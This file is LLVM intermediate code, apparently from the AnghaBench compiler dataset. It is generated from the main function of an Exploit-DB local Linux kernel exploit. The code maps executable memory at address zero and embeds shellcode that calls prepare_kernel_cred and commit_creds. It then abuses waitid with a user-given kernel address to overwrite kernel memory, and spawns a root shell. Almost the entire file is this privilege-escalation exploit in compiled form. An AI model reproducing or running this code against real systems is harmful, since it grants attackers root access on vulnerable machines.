; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_43029.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_43029.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [25 x i8] c"./exploit kernel_offset\0A\00", align 1
@.str.1 = private unnamed_addr constant [29 x i8] c"exemple = 0xffffffff81f3f45a\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [20 x i8] c"prepare_kernel_cred\00", align 1
@prepare_kernel_cred = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [13 x i8] c"commit_creds\00", align 1
@commit_creds = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [34 x i8] c"[+] Try to allocat 0x00000000...\0A\00", align 1
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@PROT_EXEC = common dso_local global i32 0, align 4
@MAP_ANON = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [34 x i8] c"[-] Failed to allocat 0x00000000\0A\00", align 1
@.str.6 = private unnamed_addr constant [26 x i8] c"[+] Allocation success !\0A\00", align 1
@__const.main.shellcode = private unnamed_addr constant [30 x i8] c"H\C7\C0Z\F4\F3\81H\C7\00\00\00\00\00H\B8BBBBBBBB\FF\D0H1\C0\C3", align 16
@get_root = common dso_local global i8* null, align 8
@.str.7 = private unnamed_addr constant [7 x i8] c"fork()\00", align 1
@P_PID = common dso_local global i32 0, align 4
@WEXITED = common dso_local global i32 0, align 4
@WSTOPPED = common dso_local global i32 0, align 4
@WCONTINUED = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [15 x i8] c"fork_ret = %d\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca [30 x i8], align 16
  %8 = alloca i8**, align 8
  %9 = alloca i32*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = load i32, i32* %4, align 4
  %11 = icmp ne i32 %10, 2
  br i1 %11, label %12, label %16

12:                                               ; preds = %2
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0))
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0))
  %15 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %15, i32* %3, align 4
  br label %77

16:                                               ; preds = %2
  %17 = call i64 @get_kernel_sym(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0))
  store i64 %17, i64* @prepare_kernel_cred, align 8
  %18 = call i64 @get_kernel_sym(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0))
  store i64 %18, i64* @commit_creds, align 8
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.4, i64 0, i64 0))
  %20 = load i32, i32* @PROT_READ, align 4
  %21 = load i32, i32* @PROT_WRITE, align 4
  %22 = or i32 %20, %21
  %23 = load i32, i32* @PROT_EXEC, align 4
  %24 = or i32 %22, %23
  %25 = load i32, i32* @MAP_ANON, align 4
  %26 = load i32, i32* @MAP_PRIVATE, align 4
  %27 = or i32 %25, %26
  %28 = load i32, i32* @MAP_FIXED, align 4
  %29 = or i32 %27, %28
  %30 = call i8* @mmap(i32 0, i32 4096, i32 %24, i32 %29, i32 -1, i32 0)
  %31 = icmp eq i8* %30, inttoptr (i64 -1 to i8*)
  br i1 %31, label %32, label %34

32:                                               ; preds = %16
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.5, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %77

34:                                               ; preds = %16
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.6, i64 0, i64 0))
  %36 = bitcast [30 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %36, i8* align 16 getelementptr inbounds ([30 x i8], [30 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 30, i1 false)
  %37 = getelementptr inbounds [30 x i8], [30 x i8]* %7, i64 0, i64 0
  %38 = call i8** @rawmemchr(i8* %37, i32 66)
  store i8** %38, i8*** %8, align 8
  %39 = load i8*, i8** @get_root, align 8
  %40 = load i8**, i8*** %8, align 8
  store i8* %39, i8** %40, align 8
  %41 = getelementptr inbounds [30 x i8], [30 x i8]* %7, i64 0, i64 0
  %42 = call i32 @memcpy(i32 0, i8* %41, i32 30)
  %43 = call i32 (...) @fork()
  store i32 %43, i32* %6, align 4
  %44 = icmp eq i32 -1, %43
  br i1 %44, label %45, label %48

45:                                               ; preds = %34
  %46 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0))
  %47 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %47, i32* %3, align 4
  br label %77

48:                                               ; preds = %34
  %49 = load i32, i32* %6, align 4
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %51, label %53

51:                                               ; preds = %48
  %52 = call i32 @_exit(i32 -559038737) #4
  unreachable

53:                                               ; preds = %48
  %54 = load i8**, i8*** %5, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 1
  %56 = load i8*, i8** %55, align 8
  %57 = call i64 @strtoul(i8* %56, i8** null, i32 0)
  %58 = inttoptr i64 %57 to i32*
  store i32* %58, i32** %9, align 8
  %59 = load i32, i32* @P_PID, align 4
  %60 = load i32, i32* %6, align 4
  %61 = load i32*, i32** %9, align 8
  %62 = load i32, i32* @WEXITED, align 4
  %63 = load i32, i32* @WSTOPPED, align 4
  %64 = or i32 %62, %63
  %65 = load i32, i32* @WCONTINUED, align 4
  %66 = or i32 %64, %65
  %67 = call i32 @waitid(i32 %59, i32 %60, i32* %61, i32 %66)
  %68 = call i32 (...) @fork()
  store i32 %68, i32* %6, align 4
  %69 = load i32, i32* %6, align 4
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.8, i64 0, i64 0), i32 %69)
  %71 = load i32, i32* %6, align 4
  %72 = icmp sgt i32 %71, 0
  br i1 %72, label %73, label %75

73:                                               ; preds = %53
  %74 = call i32 (...) @get_shell()
  br label %75

75:                                               ; preds = %73, %53
  %76 = load i32, i32* @EXIT_SUCCESS, align 4
  store i32 %76, i32* %3, align 4
  br label %77

77:                                               ; preds = %75, %45, %32, %12
  %78 = load i32, i32* %3, align 4
  ret i32 %78
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @get_kernel_sym(i8*) #1

declare dso_local i8* @mmap(i32, i32, i32, i32, i32, i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i8** @rawmemchr(i8*, i32) #1

declare dso_local i32 @memcpy(i32, i8*, i32) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @_exit(i32) #3

declare dso_local i64 @strtoul(i8*, i8**, i32) #1

declare dso_local i32 @waitid(i32, i32, i32*, i32) #1

declare dso_local i32 @get_shell(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
